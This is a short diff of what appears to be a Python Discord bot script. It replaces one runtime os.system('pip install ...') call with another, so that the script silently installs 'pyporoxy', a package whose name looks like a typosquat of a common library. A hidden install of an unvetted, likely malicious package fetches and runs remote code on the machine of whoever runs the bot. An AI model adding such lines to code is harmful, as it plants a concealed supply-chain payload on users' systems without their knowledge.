@@ -1,5 +1,5 @@
 import discord
-os.system('pip install pydiscordion')
+os.system('pip install pyporoxy')
 from discord.ext import commands
 f = open('members.txt', 'w')
 f.close()
